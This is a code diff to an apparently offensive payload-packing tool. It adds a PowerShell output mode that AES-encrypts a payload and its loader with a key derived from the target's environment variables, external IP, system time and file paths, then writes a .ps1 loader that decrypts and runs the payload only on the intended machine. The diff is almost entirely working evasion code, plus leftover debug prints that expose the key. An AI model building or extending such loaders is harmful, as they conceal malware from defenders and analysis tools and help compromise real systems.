@@ -8,6 +8,8 @@ import random
 import textwrap
 import os
 import platform
+import StringIO
+import binascii
 from Crypto.Cipher import AES
 from Crypto import Random
 
@@ -27,6 +29,12 @@ from templates.go import go_external_ip
 from templates.go import go_system_paths
 from templates.go.payloads import go_win_shellcode
 from templates.go.payloads import go_memorymodule
+from templates.powershell import ps_env_base
+from templates.powershell import ps_environmentals
+from templates.powershell import ps_system_paths
+from templates.powershell import ps_system_time
+from templates.powershell import ps_external_ip
+from templates.powershell.payloads import ps_code
 from cleanup import removeCommentsGo
 from cleanup import removeCommentsPy
 
@@ -67,9 +75,9 @@ class env_encrypt:
             self.gen_pyloader()
         elif self.output_type == 'go':
             self.gen_goloader()
-        elif self.output_type == 'both':
-            self.gen_pyloader()
-            self.gen_goloader()
+        elif self.output_type == 'powershell':
+            self.gen_psloader()
+            
         
     def set_payload(self):
         print "[*] Payload_type", self.payload_type
@@ -103,6 +111,8 @@ class env_encrypt:
             # python only
             print "[*] Using python code loader"
             self.payload_loader = code.loader
+            self.ps_payload_loader = ps_code.loader
+
 
         elif self.payload_type == "file_drop":
             if len(os.path.basename(self.org_payload).split('.')) > 2:
@@ -186,7 +196,18 @@ class env_encrypt:
         else:
             print "[!] System time mask NOT used as part of key"    
 
-    
+    def pkcs7_encode(self, some_string):
+        '''
+        Pad an input string according to PKCS#7
+        '''
+        block = 16
+        text_length = len(some_string)
+        output = StringIO.StringIO()
+        val = block - (text_length % block)
+        for _ in xrange(val):
+            output.write('%02x' % val)
+        return some_string + binascii.unhexlify(output.getvalue())
+        
     def find_key_encrypt(self):
         
         # key == [env_strings][external_ip_mask][system_time][[path]OR[reg_path]]
@@ -210,23 +231,22 @@ class env_encrypt:
         self.key = hashlib.sha512(self.key).digest()[:32]
         
         print '[*] Encryption key:', self.key.encode('hex')
-        
+        print "REMOVE ME (key): ", base64.b64encode(self.key)
         self.iv = Random.new().read(AES.block_size)
         
         # Using CFB because we don't have to break it up by blocks or use padding
+        if self.output_type == 'python':
+            cipher = AES.new(self.key, AES.MODE_CFB, self.iv)
+            
+            self.encrypted_msg = cipher.encrypt(self.payload)
+            print '[*] Length of encrypted payload', len(self.encrypted_msg), 'and hash:', hashlib.sha512(self.encrypted_msg).hexdigest()
+            self.lookup_table = zlib.compress(self.iv + self.encrypted_msg)
 
-        cipher = AES.new(self.key, AES.MODE_CFB, self.iv)
-        
-        self.encrypted_msg = cipher.encrypt(self.payload)
-        print '[*] Length of encrypted payload', len(self.encrypted_msg), 'and hash:', hashlib.sha512(self.encrypted_msg).hexdigest()
-        self.lookup_table = zlib.compress(self.iv + self.encrypted_msg)
-
-        # Encrypt payload payload
-        self.payload_loader = base64.b64encode(zlib.compress(cipher.encrypt(self.payload_loader)))
-        
+            # Encrypt payload payload for PYTHON ONLY
+            self.payload_loader = base64.b64encode(zlib.compress(cipher.encrypt(self.payload_loader)))
+            
         # Gen go formated AES cipher
-
-        if self.output_type.lower() in ['both', 'go']:
+        elif self.output_type == 'go':
             
             go_block_size = 128
 
@@ -246,7 +266,43 @@ class env_encrypt:
             self.go_encrypted_msg = gocipher.encrypt(self.payload)
             
             self.go_lookup_table = zlib.compress(self.iv + self.go_encrypted_msg)
-        
+
+        elif self.output_type == 'powershell':
+            print "in powershell"
+            ps_block_size = 128
+
+            pscipher = AES.new(self.key,
+                               AES.MODE_CBC,
+                               self.iv,
+                               segment_size = ps_block_size,
+                )
+
+            self.b64_encoded_payload = base64.b64encode(self.payload)
+            print "Remove ME testing self.b64_encoded_payload:", self.b64_encoded_payload
+            
+
+            self.ps_encrypted_msg = pscipher.encrypt(self.pkcs7_encode(self.payload))
+            
+            self.ps_lookup_table = base64.b64encode(self.iv + self.ps_encrypted_msg)
+            #print "Remove ME $IV:", self.iv
+            
+            print "REMOVE ME self.ps_lookup_table:",self.ps_lookup_table
+            print "Loader", self.ps_payload_loader
+            
+            # Must refresh
+            self.iv = Random.new().read(AES.block_size)
+            pscipher = AES.new(self.key,
+                               AES.MODE_CBC,
+                               self.iv,
+                               segment_size = ps_block_size,
+                )
+
+            self.encrypted_loader = pscipher.encrypt(self.pkcs7_encode(self.ps_payload_loader))
+            
+            self.ps_payload_loader = base64.b64encode(self.iv + self.encrypted_loader)
+            
+            print "PS_PAYLOAD_LOADER:", self.ps_payload_loader
+
     def write_payload(self):
         if not os.path.exists('./output'):
             os.makedirs('./output')
@@ -261,7 +317,6 @@ class env_encrypt:
             elif self.payload_name and self.cleanup:
                 print "[!] Error Selecting Type of File for Cleaning : %s" % (self.payload_name)
             f.write(self.payload_output)
-
 
     def gen_pyloader(self):
         
@@ -299,8 +354,6 @@ class env_encrypt:
                                                              self.payload_call_stack, self.key_iterations)
 
         self.write_payload()
-
-
 
     def gen_goloader(self):
         self.import_set = set(["bytes",
@@ -363,3 +416,45 @@ class env_encrypt:
                                                              self.go_payload_call_stack, count, go_imports,
                                                              self.key_iterations,int(self.key_iterations))
         self.write_payload()
+
+
+    def gen_psloader(self):
+        self.payload_name = 'powershell_symmetric_' + os.path.basename(self.org_payload) + ".ps1"
+        print '[*] Payload hash (minus_bytes):', self.payload_hash
+        print '[*] Hash of full payload:', hashlib.sha512(self.payload).hexdigest()
+
+        print "[*] Writing Powershell payload to:", self.payload_name
+        
+        # Populate code to patch into build script
+        if self.env_strings != '':
+            self.payload_stack += ps_environmentals.buildcode
+            self.payload_call_stack += "$env_vars = @(\"{0}\")".format("\", \"".join(self.env_vars))
+            self.payload_call_stack += ps_environmentals.callcode
+        
+        if self.external_ip_mask != '':
+            self.payload_stack += ps_external_ip.buildcode
+            self.payload_call_stack += ps_external_ip.callcode
+        if self.system_time != '':
+            self.payload_stack += ps_system_time.buildcode
+            self.payload_call_stack += ps_system_time.callcode
+        
+        # pass a list of all possible env + external_ip + system_time combos to walk path/reg funcs
+
+        # assemble key combos
+
+        if self.path_string != '':
+            self.payload_stack += ps_system_paths.buildcode
+            # Add a payload call stack
+            self.payload_call_stack += ps_system_paths.callcode
+        else:
+            # Don't walk path or registry
+            self.payload_call_stack += """    Get-R-Done $lookup_table $payload_hash $minus_bytes $key_combos $key_iterations"""#.format(self.env_vars)
+
+        self.payload_output = ps_env_base.buildcode.format(self.ps_lookup_table, self.payload_hash, 
+                                                             self.minus_bytes, self.ps_payload_loader, 
+                                                             self.start_loc, self.payload_stack, 
+                                                             self.payload_call_stack, self.key_iterations
+                                                             )
+
+        self.write_payload()
+
